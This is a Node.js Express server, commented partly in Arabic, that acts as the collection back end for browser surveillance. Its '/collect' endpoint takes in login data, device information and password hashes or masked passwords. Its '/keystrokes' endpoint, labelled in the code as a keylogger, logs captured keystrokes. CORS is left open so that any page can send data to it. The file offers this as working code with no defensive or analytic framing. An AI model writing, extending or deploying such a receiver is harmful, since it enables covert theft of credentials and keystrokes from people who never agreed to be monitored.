const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { logUserActivity } = require('./userMonitor'); // الوظيفة الأصلية

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors()); // Allow requests from React frontend
app.use(bodyParser.json({ limit: '10mb' })); // زيادة الحد إن لزم (للبيانات الكبيرة مثل keystrokes)

// Root Endpoint (Health Check)
app.get('/', (req, res) => {
    res.status(200).send('AKM SECURE SERVER NODE :: ONLINE');
});

// Monitor Endpoint - Receives Heartbeats from Dashboard
app.post('/api/monitor/heartbeat', (req, res) => {
    const { userId, username, action, platform, passwordHash, passwordMasked } = req.body;
    
    // Log the activity securely using hash/masked password
    logUserActivity({ userId, username, action, platform, passwordHash, passwordMasked });

    // Respond to client
    res.json({ 
        status: 'RECEIVED', 
        serverTime: new Date().toISOString(),
        message: 'Activity logged successfully' 
    });
});

// نقطة النهاية لجمع بيانات المتصفح (Login Data، Device Info، إلخ)
app.post('/collect', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();

    // تنسيق السجلات لدمجها مع AKM
    console.log(`
    [AKM_BROWSER_DATA] -----------------------------------------------
    TIMESTAMP : ${timestamp}
    TYPE      : Browser Data Collection
    DATA      : ${JSON.stringify(data, null, 2)}
    ------------------------------------------------------------------
    `);

    // تمرير البيانات إلى وظيفة السجل الأصلية (لتوحيد السجلات)
    logUserActivity({
        userId: data.username || 'Anonymous',
        username: data.username || 'Anonymous',
        action: 'Browser Data Collected',
        platform: data.browserInfo?.userAgent || 'Unknown',
        passwordHash: data.passwordHash || undefined,
        passwordMasked: data.passwordMasked || undefined
    });

    res.status(200).send('Data logged successfully');
});

// نقطة النهاية لجمع تسجيلات الضغط (Keylogger)
app.post('/keystrokes', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();

    console.log(`
    [AKM_KEYLOGGER] -------------------------------------------------
    TIMESTAMP : ${timestamp}
    TYPE      : Keystrokes Log
    DATA      : ${JSON.stringify(data.data, null, 2)}
    ------------------------------------------------------------------
    `);

    res.status(200).send('Keystrokes logged successfully');
});

// Start Server
app.listen(PORT, () => {
    console.log(`\n[SYSTEM] AKM Server initialized on port ${PORT}`);
    console.log(`[SYSTEM] Waiting for incoming connections...\n`);
});
